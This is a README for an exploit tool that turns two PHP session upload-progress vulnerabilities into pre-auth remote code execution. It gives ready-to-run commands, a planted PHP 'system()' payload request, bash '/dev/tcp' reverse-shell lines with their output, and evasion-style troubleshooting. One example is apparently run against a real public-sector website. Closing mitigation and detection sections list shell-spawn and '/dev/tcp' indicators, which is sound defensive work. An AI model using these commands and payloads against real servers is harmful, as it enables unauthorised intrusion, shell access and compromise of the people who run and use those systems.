# 🍉 php2shell — CVE-2026-109618 / CVE-2026-109619

> Pre-auth remote code execution & reverse shell for the two critical PHP
> core vulnerabilities patched on 2026-10-21.

```
 ____    __                 ___    ____    __              ___    ___      
/\  _`\ /\ \              /'___`\ /\  _`\ /\ \            /\_ \  /\_ \     
\ \ \L\ \ \ \___   _____ /\_\ /\ \\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \ \ ,__/\ \  _ `\/\ '__`\/_/// /__\/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
  \ \ \/  \ \ \ \ \ \ \L\ \ // /_\ \ /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ \_\   \ \_\ \_\ \ ,__//\______/ \ `\____\ \_\ \_\ \____\/\____\/\____\
    \/_/    \/_/\/_/\ \ \/ \/_____/   \/_____/\/_/\/_/\/____/\/____/\/____/
                     \ \_\                                                 
                      \/_/                                                 

   by Whackermelon  https://github.com/Whackermelon
```

**One URL in, a reverse shell out.**

```bash
# terminal 1
nc -lvnp 4444

# terminal 2
python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444
```

---

## Table of contents

- [The vulnerabilities](#the-vulnerabilities)
- [Quick start](#quick-start)
- [Examples](#examples)
- [How it works](#how-it-works)
- [Strategies](#strategies)
- [Options](#options)
- [Requirements](#requirements)
- [Troubleshooting](#troubleshooting)
- [Mitigation](#mitigation)
- [Detection](#detection)
- [References](#references)
- [Disclaimer](#disclaimer)

---

## The vulnerabilities

PHP **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35** fix two critical PHP core bugs
that chain into unauthenticated remote code execution. From the official
advisory:

| CVE | Title | Summary |
|-----|-------|---------|
| **CVE-2026-109618** | RCE via OOM corruption | An out-of-memory condition can interrupt PHP while internal request data is only partially initialised. Request cleanup may then treat the invalid data as valid. |
| **CVE-2026-109619** | RCE via stale global state | Request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialisation resets it. |

* **Affected:** PHP 5.4.0 → 8.5.x (the session upload-progress vector only
  exists from 5.4.0). PHP 8.1 and older are EOL and will **never** be
  patched.
* **Fixed in:** 8.5.12, 8.4.27, 8.3.36, 8.2.35.
* **CVSS v4.0:** 9.2 (Critical).
* **Exploited in the wild** since 2026-10-21, mostly through the session
  upload-progress path.

The reachable surface is the session upload-progress handler in
`ext/session/session.c`, which has three independent problems:

1. **Session fixation (pre-auth).** `MULTIPART_EVENT_FORMDATA` copies the
   POST-body field named `PHPSESSID` into the progress session id **without
   checking `session.use_only_cookies`**. The attacker therefore chooses the
   session id — and hence the on-disk session file name.
2. **Unvalidated file name.** `MULTIPART_EVENT_FILE_START` stores the *raw*
   uploaded file name into the session data, with no sanitisation at all.
3. **Attacker-controlled session content.** The POST-body field named
   `PHP_SESSION_UPLOAD_PROGRESS` becomes the session key
   `upload_progress_<value>`, stored **verbatim**.

Because the progress data is serialised into the attacker's *own* session
file, and PHP's session serialiser is not a sandbox, the attacker fully
controls the **content** of a file whose name is **fully predictable**:

```
<session.save_path>/sess_<chosen session id>
```

---

## Quick start

Requirements: **Python 3.8+**, standard library only. No dependency, no
build step.

```bash
git clone https://github.com/Whackermelon/php2shell-CVE-2026-109618-CVE-2026-109619.git
cd php2shell-CVE-2026-109618-CVE-2026-109619
chmod +x php2shell.py
```

**Reverse shell**

```bash
# on your machine
nc -lvnp 4444

# then
python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444
```

**One-shot command**

```bash
python3 php2shell.py https://target.example.com/index.php -c 'id'
```

The PoC prints what it did; the shell lands on your listener.

---

## Examples

### Example 1 — reverse shell, everything auto-detected

```console
$ nc -lvnp 4444
$ python3 php2shell.py http://127.0.0.1:8088/sink.php -l 127.0.0.1 -p 4444 -v

  php2shell  -  CVE-2026-109618 / CVE-2026-109619  (pre-auth RCE)

[*] target   : http://127.0.0.1:8088/sink.php
[*] session  : u9bavj3i070qhddg8vfptmhluj
[*] command  : bash -c 'exec bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' </dev/null >/dev/null 2>&1 &
[*] listener : 127.0.0.1:4444
[*] probe /sink.php            -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] probe /index.php           -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] probe /                    -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] no --sink given, probing for an include() sink ...
[+] found sink: /sink.php?page=<SESSIONFILE>  (session file /tmp/sess_u9bavj3i070qhddg8vfptmhluj)
[*] poisoned session (attempt 1) HTTP 200
[*] trigger via /sink.php?page=/tmp/sess_u9bavj3i070qhddg8vfptmhluj -> HTTP 200 (712 bytes)

[+] payload delivered via: strategy1
[+] check your listener: nc -lvnp 4444
```

On the listener side:

```console
$ nc -lvnp 4444
bash: impossible de régler le groupe de processus du terminal (183758): Ioctl() inapproprié
bash: pas de contrôle de tâche dans ce shell
adam@adam:/var/www/html$
```

### Example 2 — explicit sink and session path

When the automatic probe cannot find the inclusion sink (the app uses an
unusual parameter name, or the session directory is unusual):

```console
$ python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 \
      --sink '/index.php?page=<SESSIONFILE>' --save-path /var/lib/php/sessions -v

[*] target   : https://target/index.php
[*] session  : 4kahwb10zswy6byfbt90yt4fbd
[*] command  : bash -c 'exec bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' </dev/null >/dev/null 2>&1 &
[*] listener : 10.0.0.5:4444
[*] probe /index.php           -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] using sink /index.php?page=<SESSIONFILE>  session file /var/lib/php/sessions/sess_4kahwb10zswy6byfbt90yt4fbd
[*] poisoned session (attempt 1) HTTP 200
[*] trigger via /index.php?page=/var/lib/php/sessions/sess_4kahwb10zswy6byfbt90yt4fbd -> HTTP 200 (712 bytes)

[+] payload delivered via: strategy1
```

### Example 3 — one-shot command

```console
$ python3 php2shell.py http://127.0.0.1:8088/sink.php -c 'id' -v

[*] target   : http://127.0.0.1:8088/sink.php
[*] session  : hk7uurfl0cs6prwzia0yomh1cp
[*] command  : id
[*] probe /sink.php            -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] no --sink given, probing for an include() sink ...
[+] found sink: /sink.php?page=<SESSIONFILE>  (session file /tmp/sess_hk7uurfl0cs6prwzia0yomh1cp)
[*] poisoned session (attempt 1) HTTP 200
[*] trigger via /sink.php?page=/tmp/sess_hk7uurfl0cs6prwzia0yomh1cp -> HTTP 200 (712 bytes)

[+] payload delivered via: strategy1
```

### Example 4 — serialiser handler mismatch (no LFI needed)

```console
$ python3 php2shell.py https://target/app/upload.php \
      --write-path /app/upload.php --read-path /api/endpoint.php -c 'id' -v

[*] target   : https://target/app/upload.php
[*] session  : e4s92uz81cj9egobc29edsgmsg
[*] command  : id
[*] probe /app/upload.php      -> HTTP 200  PHP/8.4.24         Apache/2.4.68 (Debian) PHP/8.4.24  [PHP]
[*] strategy 2: write /app/upload.php / read /api/endpoint.php
[*] handler mismatch TRIGGERED

[+] payload delivered via: strategy2
```

### Example 5 — target in maintenance mode

The PoC refuses to fire against a target that never reaches PHP, and says
so explicitly instead of failing silently:

```console
$ python3 php2shell.py https://formulaires.pasdecalais.fr/index.php -c whoami -v

[*] target   : https://formulaires.pasdecalais.fr/index.php
[*] session  : 5kxhklckgsco15mhtowudiqc21
[*] command  : whoami
[*] probe /index.php           -> HTTP 500                     nginx
[*] probe /                   -> HTTP 200                     nginx
[*] probe /index.html         -> HTTP 200                     nginx
[*] probe /app.php             -> HTTP 500                     nginx
[*] probe /form.php            -> HTTP 500                     nginx
[*] probe /upload.php          -> HTTP 500                     nginx
[!] no PHP endpoint found.
    Every candidate path either errored out (HTTP 5xx) or was
    served by the web server without ever reaching a PHP
    interpreter (no X-Powered-By, no PHP fingerprint).
    The application is very likely in maintenance mode or behind
    a broken vhost, so there is no session module to attack
    right now.  Retry when the site is back online.
```

---

## How it works

### Step 1 — pre-auth session fixation

The multipart parser hands every `name="PHPSESSID"` field to the session
module's progress callback, which stores it as the progress session id
**without** honouring `session.use_only_cookies`:

```c
/* ext/session/session.c, MULTIPART_EVENT_FORMDATA */
if (name_len == progress->sname_len &&
    memcmp(data->name, PS(session_name), name_len) == 0) {
    zval_ptr_dtor(&progress->sid);
    ZVAL_STRINGL(&progress->sid, (*data->value), value_len);
}
```

Request:

```http
POST /index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="PHPSESSID"

attackerchosenid
--X
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system(base64_decode("...")); ?>
--X--
```

The attacker now knows the exact server-side path of their session file:
`<session.save_path>/sess_attackerchosenid`.

### Step 2 — writing attacker content into the session file

The `PHP_SESSION_UPLOAD_PROGRESS` value becomes the session key
`upload_progress_<value>`, and the session serialiser writes it verbatim.
On disk, with the `php` handler:

```
upload_progress_<?php system(base64_decode("YmFzaCAtYyAn...")); ?>|a:5:{s:10:"start_time";i:1792596599;...}
```

The payload is base64-encoded so it can carry **any** command without
tripping the session serialiser's `|` and newline restrictions.

### Step 3 — triggering execution

If the application includes the session file (an `include()`/`require()`
sink), the embedded `<?php ... ?>` block executes. The command's own output
is returned inside the HTTP response.

The PoC auto-detects this by poisoning a session with a harmless marker
and looking for the marker in the response, trying the common parameter
names (`page`, `file`, `path`, `doc`, `include`, `view`, `lang`, …) against
the common save paths (`/tmp`, `/var/lib/php/sessions`, …).

---

## Strategies

### Strategy 1 — session file poisoning + inclusion sink

The most general approach: works against any target with an
`include()`/`require()` sink that can be pointed at a session file, and
needs **no knowledge of the target's PHP build**.

Needs:

* `session.upload_progress.enabled = On` (PHP default)
* `session.upload_progress.cleanup = Off` — so the poisoned entry is not
  deleted at the end of the upload (**PHP's default is `On`**, so this has
  to be changed server-side)
* an `include()`/`require()` sink reachable with a user-controlled path

### Strategy 2 — serialiser handler mismatch → object injection

If two directories use different `session.serialize_handler` values, a
session written as `php_serialize` and read back with the `php` handler is
re-parsed as a `key|value` stream. A file name containing `|` shifts the
parse so that attacker bytes get deserialised as a serialized object, whose
`__destruct` runs during cleanup — **even though the decode returns
FAILURE**, because `__destruct` fires on both the success and the failure
path of `var_destroy()`.

Needs:

* two reachable directories with different `session.serialize_handler`
* a class with a useful `__destruct` that is autoloadable on the target

---

## Options

```
python3 php2shell.py URL [options]

  -l, --lhost        reverse shell listener address
  -p, --lport        reverse shell listener port (default 4444)
  -c, --cmd          command to execute instead of a reverse shell
  --sid              session id to use (default: random)
  --session-name     PHP session name (default: auto-detected, usually
                     PHPSESSID)
  --fix-by           how the chosen session id is sent: "body" (the CVE
                     route, default) or "cookie" (the early_find_sid route)
  --save-path        server-side session save path
  --sink             inclusion sink URL, e.g. '/index.php?page=<SESSIONFILE>'
  --write-path       php_serialize directory (strategy 2)
  --read-path        php directory (strategy 2)
  --gadget           serialized object injected by strategy 2
  --all              try every strategy (default behaviour)
  --no-banner        do not print the watermelon banner
  --timeout          per-request timeout in seconds (default 30)
  -v, --verbose      verbose output
```

`<SESSIONFILE>` in `--sink` is replaced by the discovered
`<save_path>/sess_<session id>` path.

---

## Requirements

**On the target**

* an unpatched PHP: **< 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35** (PHP 5.4 →
  8.5.x are all affected; 8.1 and older are EOL and never patched)
* `session.upload_progress.enabled = On` (default)
* `session.upload_progress.cleanup = Off` (non-default — **required by
  strategy 1**)
* for strategy 2: two directories with different `session.serialize_handler`

**Locally**

* Python 3.8+ (standard library only)
* `nc` / `ncat` / `socat` for the listener

---

## Troubleshooting

**`[!] no PHP endpoint found`**
Every candidate path returned HTTP 5xx or was served statically, and none
of them reached a PHP interpreter. The application is in **maintenance
mode** or behind a broken vhost — there is no session module to attack.
Retry when the site is back up.

**`HTTP 421 Misdirected Request`**
Some CDNs (Akamai, Cloudflare) reject a `Host` header that carries the
port when it is the scheme default. The PoC omits `:443` / `:80` in that
case; if you drive it with your own client, do the same.

**`the target did not echo the session id we sent in the POST body`**
This is a warning, not an error: plenty of applications never resend their
session cookie, and the chain still works if the session *file* is created
under the id we chose.  If the exploit does not fire though, the session
name is probably not the one that was detected, so pass it explicitly:

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 \
    --session-name ac3_sessionAdminId
```

The name is auto-detected from the cookies the target sets, but a lot of
applications rename the session, and some regenerate the id
(`session_regenerate_id`) or roll their own session layer - in the latter
two cases this chain cannot work on that target at all.

**The session id is ignored in the POST body but accepted in a cookie**
Some applications regenerate the id they are given in the body while
still honouring the one in the cookie.  The upload-progress handler
reaches the session id by two routes, and the cookie one is the second:

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 --fix-by cookie
```

`--fix-by cookie` sends the chosen id in the `Cookie` header instead of
the POST body.  The handler then picks it up through `early_find_sid()`,
which reaches the same place in the code.

**`no include() sink detected`**
Strategy 1 needs an `include()`/`require()` sink. Pass it explicitly:

```bash
python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 \
    --sink '/index.php?page=<SESSIONFILE>' --save-path /var/lib/php/sessions
```

`--save-path` is the server-side `session.save_path`; the session file is
`<save_path>/sess_<session id>`.

**The payload is delivered but nothing happens**
`system()`, `exec()`, `passthru()`, `shell_exec()` and `proc_open()` are
frequently disabled with `disable_functions`. Check the target's
configuration; if the shell functions are gone, use another execution
primitive.

**`Session cookie cannot be sent after headers have already been sent`**
The target emits output (or a warning) before the session code runs. This
does not affect the exploit.

---

## Mitigation

Update PHP to **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35**, or to your vendor's
backport. Until then, per the official advisory:

```ini
; CVE-2026-109619 - blocks the confirmed session paths.
; Set it before request parsing (php.ini, FPM pool or server config)
; and RESTART every worker.  ini_set() and .user.ini are not enough.
session.upload_progress.enabled = 0

; CVE-2026-109618 - removes the controllable memory-limit failure.
; Use php_admin_value in the FPM pool or the Apache configuration so
; the application cannot override it.
memory_limit = -1

; Keep the request small; lower it if the app does not need uploads.
post_max_size = 8M        ; 32M if file uploads are required
upload_max_filesize = 8M
```

Hardening (defence in depth, not a fix):

```ini
session.use_only_cookies = On
session.use_strict_mode = On
session.serialize_handler = php_serialize   ; consistently, everywhere
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

Also: use a container or cgroup limit as an availability boundary (a
policy that kills only the affected worker), and do not use `RLIMIT_AS` or
`RLIMIT_DATA` as a substitute — they can also reach the vulnerable
allocation failure.

---

## Detection

Alert when a PHP worker process spawns a child it should never spawn:

* `php-fpm`, `php-cgi`, `lsphp`, `httpd`, `apache2`
* children: `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`, `python`,
  `perl`, `curl`, `wget`, `nc`, `certutil.exe`
* command lines containing `/dev/tcp/`, `fsockopen`, `mkfifo`
* immediate reconnaissance: `whoami`, `id`, `uname -a`, `ipconfig`

Also:

* grep the web access logs for `PHP_SESSION_UPLOAD_PROGRESS`
* look for session files containing `upload_progress_` followed by `<?php`
  in `session.save_path`
* watch for new files in the web root, `/tmp`, `/var/tmp`, new cron jobs
  and new accounts

Florian Roth's [process-watcher](https://github.com/Neo23x0/process-watcher)
is a good free tool for the process-spawn side.

---

## References
* `GHSA-w8hw-w9fx-j79w` (CVE-2026-109618)
* `GHSA-6wmf-4rv5-p3rp` (CVE-2026-109619)
* [watchTowr — PHP CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
* [sansec — PHP2Shell research](https://sansec.io/research/php2shell)
* [Hadrian — php2shell exploited in the wild](https://hadrian.io/vulnerability-alerts/php2shell-leaked-critical-php-rce-cve-2026-109618-cve-2026-109619)
* [CERT-EU advisory 2026-018](https://cert.europa.eu/publications/security-advisories/2026-018)
* [PHP session upload-progress internals](https://github.com/php/php-src/blob/PHP-8.4/ext/session/session.c)
* [PHP multipart parser](https://github.com/php/php-src/blob/PHP-8.4/main/rfc1867.c)

---

## Repository layout

```
php2shell.py   the PoC (stdlib only, Python 3.8+)
README.md      this file
LICENSE        MIT
```

The banner artwork is embedded in `php2shell.py`, so the PoC is a single
self-contained file: copy it anywhere and it still works.

## Disclaimer

For **authorised security testing and education only**. Use only against
systems you own or have explicit written permission to test. The authors
accept no liability for any misuse of this tool.

## License

MIT — see [LICENSE](LICENSE).
